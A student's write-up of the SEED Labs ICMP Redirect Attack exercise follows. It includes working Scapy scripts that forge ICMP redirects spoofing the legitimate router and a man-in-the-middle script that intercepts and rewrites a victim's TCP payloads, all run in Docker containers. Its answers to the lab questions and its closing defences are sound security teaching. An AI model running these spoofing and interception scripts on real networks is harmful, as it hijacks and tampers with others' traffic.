# ICMP Redirect Attack Lab
**Course:** Network Security — SEED Labs  
**Topic:** ICMP Redirect Attack & Man-in-the-Middle using Scapy

---

## 📋 Table of Contents
- [Lab Overview](#lab-overview)
- [Lab Setup Environment](#lab-setup-environment)
- [Network Topology](#network-topology)
- [Task 1: Launching ICMP Redirect Attack](#task-1-launching-icmp-redirect-attack)
  - [Before the Attack](#before-the-attack)
  - [Executing the Attack](#executing-the-attack)
  - [Q1: Can you redirect to a remote machine?](#q1-can-you-redirect-to-a-remote-machine)
  - [Q2: Can you redirect to a non-existing machine?](#q2-can-you-redirect-to-a-non-existing-machine)
  - [Q3: Effect of send_redirects=1 on Malicious Router](#q3-effect-of-send_redirects1-on-malicious-router)
- [Task 2: Launching the MITM Attack](#task-2-launching-the-mitm-attack)
  - [Q4: Which direction of traffic to capture?](#q4-which-direction-of-traffic-to-capture)
  - [Q5: IP filter vs MAC filter](#q5-ip-filter-vs-mac-filter)
- [Key Observations](#key-observations)

---

## Lab Overview

This lab focuses on the **ICMP Redirect Attack**, a network-layer attack that manipulates a victim's routing table. Using **Scapy** inside a SEED Lab Docker environment, we explore:

- How a forged ICMP Redirect message can reroute a victim's traffic through a malicious router
- The constraints of ICMP redirects (local subnet only, no remote gateways)
- How to leverage ICMP Redirect to launch a full **Man-in-the-Middle (MITM)** attack
- How to intercept and **modify live TCP data** between a victim and a server

---

## Lab Setup Environment

### Step 1 — Download the Lab Setup
1. Open the SEED VM and launch **Firefox**
2. Go to: **SEED Labs → Network Security → ICMP Redirect Attack**
3. Download the **labsetup.zip** file

### Step 2 — Prepare the Lab Directory
```bash
# Move to Documents > ICMP folder and unzip
unzip labsetup.zip

# Right-click inside the Labsetup folder → Open Terminal
```

### Step 3 — Build and Start Docker Containers
```bash
cd ~/ICMP/Labsetup

dcbuild   # Build all container images
dcup      # Start all containers
```

**Expected output after `dcup`:**
```
Creating network "net-10.9.0.0" with the default driver
Creating network "net-192.168.60.0" with the default driver
Creating router                        ... done
Creating victim-10.9.0.5              ... done
Creating attacker-10.9.0.105          ... done
Creating host-192.168.60.6            ... done
Creating malicious-router-10.9.0.111  ... done
Creating host-192.168.60.5            ... done
```

### Step 4 — Connect to Containers
```bash
# List all running containers
dockps

# Output:
# c95ab78b6273  host-192.168.60.5
# 9a453a8a7f29  malicious-router-10.9.0.111
# 39f06daa9cd3  host-192.168.60.6
# 2a1661effb3d  attacker-10.9.0.105
# 569fa28db660  victim-10.9.0.5
# 6e181e408d5b  router

# Connect to Attacker container
docksh 2a

# Disable ICMP redirect acceptance on the Attacker container
sysctl net.ipv4.conf.all.accept_redirects=0
```

---

## Network Topology

| Container | IP Address | Role |
|-----------|-----------|------|
| Victim | 10.9.0.5 | Target being attacked |
| Attacker | 10.9.0.105 | Sends forged ICMP Redirect |
| Malicious Router | 10.9.0.111 | Intercepts rerouted traffic |
| Legitimate Router | 10.9.0.11 | Normal gateway |
| Host B1 | 192.168.60.5 | Remote target host |
| Host B2 | 192.168.60.6 | Remote host |

**Normal routing path (before attack):**
```
Victim (10.9.0.5) → Legit Router (10.9.0.11) → Host (192.168.60.5)
```

**After ICMP Redirect attack:**
```
Victim (10.9.0.5) → Malicious Router (10.9.0.111) → Legit Router (10.9.0.11) → Host (192.168.60.5)
```

---

## Task 1: Launching ICMP Redirect Attack

### Before the Attack

**Check the victim's routing table:**
```bash
# On Victim container
ip route
```
Output:
```
default via 10.9.0.1 dev eth0
10.9.0.0/24 dev eth0 proto kernel scope link src 10.9.0.5
192.168.60.0/24 via 10.9.0.11 dev eth0
```
The victim uses the **legitimate router (10.9.0.11)** to reach the 192.168.60.0/24 network.

**Run mtr to verify normal path (before attack):**
```bash
# On Victim container
mtr -n 192.168.60.5
```
Output (before attack):
```
Host            Loss%  Snt  Last  Avg
1. 10.9.0.11    0.0%   13   0.1   0.1
2. 192.168.60.5 0.0%   13   0.1   0.1
```
Only 2 hops — victim goes directly through the legitimate router.

---

### Executing the Attack

**Create `icmp_task1.py` in the Attacker's volumes folder:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Forge an ICMP Redirect message
# Tell the victim: "Use 10.9.0.111 (malicious router) to reach 192.168.60.5"

ip = IP(src='10.9.0.11',       # Spoof as the legitimate router
        dst='10.9.0.5')        # Send to victim

icmp = ICMP(type=5,            # Type 5 = Redirect
            code=1,            # Code 1 = Redirect for host
            gw='10.9.0.111')   # New gateway = malicious router

# Embed original IP header + 8 bytes of original packet
ip2 = IP(src='10.9.0.5', dst='192.168.60.5')
icmp2 = ICMP()

pkt = ip / icmp / ip2 / icmp2
send(pkt)
print("ICMP Redirect sent.")
```

```bash
# Run the attack from Attacker container
python3 icmp_task1.py
```

Output:
```
Sent 1 packets.
ICMP Redirect sent.
```

**Verify on Victim — run mtr again:**
```bash
mtr -n 192.168.60.5
```

Output (after attack):
```
Host              Loss%  Snt  Last  Avg
1. 10.9.0.111     0.0%   6    0.1   0.1   ← Malicious Router (NEW!)
2. 10.9.0.11      0.0%   6    0.2   0.1   ← Legit Router
3. 192.168.60.5   0.0%   6    0.1   0.1
```

✅ The routing path changed — **attacker successfully inserted the malicious router** into the communication path!

---

### Q1: Can you redirect to a remote machine?

**Answer: No.**

Testing with a public IP (`1.1.1.1`) as the gateway:

```python
# icmp_task1a.py — change gateway to remote IP
icmp = ICMP(type=5, code=1, gw='1.1.1.1')   # Remote, off-subnet IP
```

```bash
python3 icmp_task1a.py
```

**mtr output on Victim — unchanged:**
```
Host              Loss%  Snt
1. 10.9.0.111     0.0%   17   ← still shows previous redirect
2. 10.9.0.11      0.0%   17
3. 192.168.60.5   0.0%   17
```

> **Observation:** The victim's OS **ignored** the redirect pointing to `1.1.1.1`. ICMP Redirects are only accepted if the new gateway is **on the same local subnet** as the victim. Off-link (remote) gateways are automatically discarded by the operating system.

---

### Q2: Can you redirect to a non-existing machine on the same network?

**Answer: The route changes, but MITM fails.**

Testing with a non-existing local IP (`10.9.0.99`):

```bash
# Verify 10.9.0.99 does not exist
ping 10.9.0.99
# Output: Destination Host Unreachable
```

```python
# icmp_task1b.py — change gateway to non-existing host
icmp = ICMP(type=5, code=1, gw='10.9.0.99')
```

```bash
python3 icmp_task1b.py
```

**mtr output on Victim:**
```
Host              Loss%  Snt
1. 10.9.0.11      0.0%   13
2. 192.168.60.5   0.0%   12
```

> **Observation:** The redirect was accepted and the victim's routing table was briefly updated. However, since `10.9.0.99` has no MAC address, the victim cannot forward packets — ARP requests go unanswered and traffic falls back to the legitimate router after the ARP cache expires. The attack **"succeeds"** in changing the route but **"fails"** at achieving actual MITM interception.

---

### Q3: Effect of send_redirects=1 on Malicious Router

**Setup — Edit `docker-compose.yml` in the Malicious Router section:**

```yaml
malicious-router:
  sysctls:
    - net.ipv4.ip_forward=1
    - net.ipv4.conf.all.send_redirects=1        # Changed from 0 to 1
    - net.ipv4.conf.default.send_redirects=1    # Changed from 0 to 1
    - net.ipv4.conf.eth0.send_redirects=1       # Changed from 0 to 1
```

**Rebuild and restart:**
```bash
# Shut down containers
dcdown

# Rebuild
dcbuild

# Restart
dcup
```

**Run the attack again, then check mtr on Victim:**
```bash
python3 icmp_task1.py    # from attacker
mtr -n 192.168.60.5      # from victim
```

**mtr output:**
```
Host              Loss%  Snt
1. 10.9.0.11      0.0%   6
2. 192.168.60.5   0.0%   6
```

> **Observation:** The ICMP Redirect attack **failed completely**. With `send_redirects=1`, the malicious router itself sends a legitimate ICMP Redirect back to the victim, correcting the route and removing the attacker from the path. This "heals" the victim's routing table and restores the correct route.

**Purpose of the `send_redirects=0` entries:**  
These sysctls disable the malicious router's kernel from sending its own legitimate redirect messages. Without them, the kernel would undo the attacker's spoofed redirect, defeating the attack. Setting them to `0` ensures **only the attacker's forged redirect** is present on the network.

> **My Observation:** After changing values to 1 and rebuilding, I launched the spoofed ICMP redirect attack. The `mtr` output showed only the legitimate router (10.9.0.11) — no trace of the malicious router (10.9.0.111) in the path. The attack failed completely.

---

## Task 2: Launching the MITM Attack

**Before starting:** Revert `send_redirects` back to `0` in `docker-compose.yml` and rebuild.

### Step 1 — Verify Normal Connectivity
```bash
# On Victim
ping 192.168.60.5
ip route
mtr -n 192.168.60.5
```

### Step 2 — Set Up Netcat on Host B (192.168.60.5)
```bash
# On host-192.168.60.5 container
nc -lp 9090
```

### Step 3 — Disable IP Forwarding on Malicious Router
```bash
# On malicious-router container (d00)
sysctl -w net.ipv4.ip_forward=0
```

### Step 4 — Launch the MITM Script on Malicious Router
```bash
# Navigate to volumes folder on malicious router
cd /volumes
ls
# icmp_task1.py  icmp_task1a.py  icmp_task1b.py  mitm_sample.py

python3 mitm_sample.py
```

**`mitm_sample.py` — key logic:**
```python
#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)

    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print("*** %s, length: %d" % (data, len(data)))

        # Replace victim's name with AAAA
        newdata = data.replace(b'naga', b'AAAA')
        send(newpkt/newdata)
    else:
        send(newpkt)

# Filter: only capture TCP from victim to server
f = 'tcp and src host 10.9.0.5 and dst host 192.168.60.5'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

### Step 5 — Connect from Victim to Server
```bash
# On Victim container
nc 192.168.60.5 9090
```

Type messages in the Victim terminal: `hi`, `naga`, `my first name`, `naga`

### Step 6 — Check What Server Received
```bash
# On host-192.168.60.5 (server) terminal
# Output received:
hi
AAAA           ← "naga" was replaced!
my first name
AAAA           ← "naga" was replaced!
```

#### ✅ Output / Observation
The MITM attack was **fully successful**. The `mitm_sample.py` script intercepted all TCP packets from the victim and replaced every occurrence of `naga` with `AAAA` before forwarding to the server. The victim had no indication that their messages were being modified.

---

### Q4: Which direction of traffic do you need to capture?

**Answer: Only the victim → server direction (`10.9.0.5 → 192.168.60.5`).**

- The **victim** is the one typing messages (actual payload data)
- The **server** only sends ACK packets ("got it!") which contain no message text
- The MITM goal is to modify the victim's outgoing messages before they reach the server
- Capturing server → victim traffic is unnecessary since ACKs have no modifiable content

Correct filter:
```python
f = 'tcp and src host 10.9.0.5 and dst host 192.168.60.5'
```

---

### Q5: IP filter vs MAC filter

**Answer: IP-based filtering is correct and robust. MAC-based filtering is unreliable.**

**Testing MAC filter:**
```python
# MAC-based filter (unreliable)
f = 'tcp and ether src 02:42:0a:09:00:05 and dst host 192.168.60.5'
```

**Testing IP filter:**
```python
# IP-based filter (correct)
f = 'tcp and src host 10.9.0.5 and dst host 192.168.60.5'
```

| Filter Type | After lab restart | Reliability |
|-------------|------------------|-------------|
| IP-based (`src host 10.9.0.5`) | ✅ Works correctly | **Recommended** |
| MAC-based (`ether src 02:42:...`) | ❌ Fails — MAC changes | Unreliable |

> **Observation:** IP addresses are fixed identifiers assigned in `docker-compose.yml`. MAC addresses are temporary — Docker reassigns different MACs every time containers are recreated. After a lab restart, the MAC-based filter failed to capture any packets even though the script executed. IP-based filtering always worked correctly across restarts.

---

## Key Observations

| Task | Action | Result |
|------|--------|--------|
| Task 1 | Forged ICMP Redirect (local gateway) | Victim's route changed — attack succeeded |
| Q1 | Redirect to remote IP (1.1.1.1) | Ignored by OS — only local subnet gateways accepted |
| Q2 | Redirect to non-existing host (10.9.0.99) | Route briefly changed but no traffic forwarded — MITM failed |
| Q3 | send_redirects=1 on malicious router | Attack failed — kernel restored correct route automatically |
| Task 2 | MITM with mitm_sample.py | `naga` → `AAAA` replacement confirmed on server |
| Q4 | Traffic direction | Only victim→server needs capturing (server sends ACKs only) |
| Q5 | Filter method | IP filter reliable; MAC filter fails after container restart |

> **Security Takeaway:** ICMP Redirect attacks exploit the lack of authentication in the ICMP protocol. Defenses include **disabling ICMP Redirect acceptance** (`net.ipv4.conf.all.accept_redirects=0` on all hosts), using **static routes** for critical paths, deploying **encrypted protocols (SSH/TLS)** so intercepted data is unreadable, and **monitoring routing table changes** as indicators of attack.

---

*Lab completed as part of the SEED Labs Network Security curriculum.*
